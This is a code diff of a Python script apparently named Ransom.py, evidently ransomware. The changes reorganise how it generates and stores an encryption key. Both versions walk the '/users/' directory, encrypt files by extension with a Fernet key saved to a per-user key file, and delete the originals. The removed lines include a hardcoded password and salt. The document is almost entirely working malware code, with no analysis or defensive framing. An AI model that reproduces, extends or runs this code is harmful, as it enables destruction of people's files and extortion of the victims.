@@ -6,28 +6,16 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from cryptography.fernet import Fernet
 import os, sys, socket, wget, struct, ctypes, shutil, base64
-
-password = b"28c5497c5b26f5e44d4b823738a8ad2d"
+# ENVIRONMENT VARIABLE
 usr = os.environ["USERNAME"]
-
+usrkey = "%s.key" %(usr)
+# GENERATE KEY FUNCTION
 def genkey(name):
     global key
-    salt = b'\x82k\x19r%j\xe6\xf6\xda\x94&h9\xfd\xba\x0c'
-    kdf = PBKDF2HMAC(
-	    algorithm=hashes.SHA256(),
-	    length=32,
-	    salt=salt,
-	    iterations = 1000000,
-	    backend=default_backend()
-    )
-    key = base64.urlsafe_b64encode(kdf.derive(password))
     key = Fernet.generate_key()
-    print("The key is : %s" %(key))
-    file = open(usr+".key", "wb")
-    file.write(key)
-    file.close()
-
-#FILE ENCYPTING FUNCTION
+    with open(usrkey, "wb") as file:
+        file.write(key)
+# FILE ENCYPTING FUNCTION
 def file_ecrypt(key, name):
     if (name!="Ransom.py"):
         with open(name,'rb') as files:
@@ -43,11 +31,11 @@ def file_ecrypt(key, name):
             os.remove(name)
         except:
             pass
-#LIST ALL FILES EXTENTIONS AND INVOKE ENCRYPTION FUNCTION
+# LIST ALL FILES EXTENSIONS AND INVOKE ENCRYPTION FUNCTION
 def filelist():
-    spec = ['/users/']
-    for i in spec:
-        for root, dirs, files in os.walk(i):
+    rep = ['/users/']
+    for user in rep:
+        for root, dirs, files in os.walk(user):
             for file in files:
                 for ext in file.split("."):
                     try:
@@ -56,5 +44,5 @@ def filelist():
                             file_ecrypt(key, ally)
                     except PermissionError:
                         pass
-		    except:
-			pass
+                    except:
+                        pass
